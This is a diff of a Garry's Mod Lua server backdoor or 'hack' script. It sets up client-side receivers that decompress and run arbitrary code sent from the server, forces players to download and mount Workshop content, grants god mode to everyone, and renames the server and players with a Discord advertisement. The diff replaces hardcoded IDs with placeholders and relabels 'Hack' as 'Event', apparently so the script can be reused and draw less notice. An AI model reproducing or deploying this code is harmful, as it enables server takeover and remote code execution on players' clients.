@@ -25,7 +25,7 @@ BroadcastLua([[net.Receive("]] .. randomtable["CodeRandom"] .. [[",function()Com
 hook.Add("PlayerInitialSpawn", "Spawn", function(ply)
     if not ply:IsBot() then
         ply:SendLua([[net.Receive("]] .. randomtable["CodeRandom"] .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
-        ply:SendLua([[steamworks.DownloadUGC(1976212612, function(n) game.MountGMA(n) game.AddParticles("particles/lesheitan.pcf") PrecacheParticleSystem("lesheitan") end)]])
+        ply:SendLua([[steamworks.DownloadUGC(YOUR_ID, function(n) game.MountGMA(n) game.AddParticles("particles/YOUR_PCF.pcf") PrecacheParticleSystem("CHANGE_ME") end)]])
     end
 end)
 
@@ -40,26 +40,25 @@ end
 -- Download
 for k, v in pairs(player.GetAll()) do
     v:SendLua("steamworks.FileInfo(1518736064,function(result)steamworks.Download(result.fileid,true,function(name)game.MountGMA(name)end) end)")
-    v:SendLua([[steamworks.DownloadUGC(1976212612, function(n) game.MountGMA(n) game.AddParticles("particles/lesheitan.pcf") PrecacheParticleSystem("lesheitan") end)]])
+    v:SendLua([[steamworks.DownloadUGC(YOUR_WORKSHOP_ID, function(n) game.MountGMA(n) game.AddParticles("particles/CHANGE_ME.pcf") PrecacheParticleSystem("CHANGE_ME") end)]])
 end
 
 -- Change Server
 timer.Simple(2.5, function()
-    RunConsoleCommand("hostname", "Server Hack by Kurama -) discord.gg/kurama")
+    RunConsoleCommand("hostname", "Server Event by  Kurama -) discord.gg/kurama")
     RunConsoleCommand("ulx", "god", "*")
-    RunConsoleCommand("sv_loadingurl", "https://image.noelshack.com/fichiers/2020/04/1/1579541483-monokuma-text-ganged-serveur.gif")
     RunConsoleCommand("sv_alltalk", "1")
         for k, v in pairs(player.GetAll()) do
     v:SendLua([[RunConsoleCommand("gmod_language", "ko")]])
 end
-    PrecacheParticleSystem("lesheitan")
+    PrecacheParticleSystem("CHANGE_ME")
 end)
 
 -- Custom Settings Server
 timer.Create("PlayerName", 5, 99, function()
     for _, v in pairs(player.GetAll()) do
         v:GodEnable()
-        v:setDarkRPVar("rpname", "Serveur Hack by Kurama -) Join Discord : discord.gg/kurama")
+        v:setDarkRPVar("rpname", "Event by Kurama -) Join Discord : discord.gg/kurama")
     end
 end)
 
@@ -88,7 +87,7 @@ timer.Simple(5, function()
 InfoClient([[net.Receive("]] .. randomtable["TimingRandom"] .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
 InfoClient([[
     for i = 1, 10 do
-    ParticleEffectAttach("lesheitan", PATTACH_ABSORIGIN_FOLLOW, LocalPlayer(), 0)
+    ParticleEffectAttach("CHANGE_ME", PATTACH_ABSORIGIN_FOLLOW, LocalPlayer(), 0)
 end
 ]])
 end)
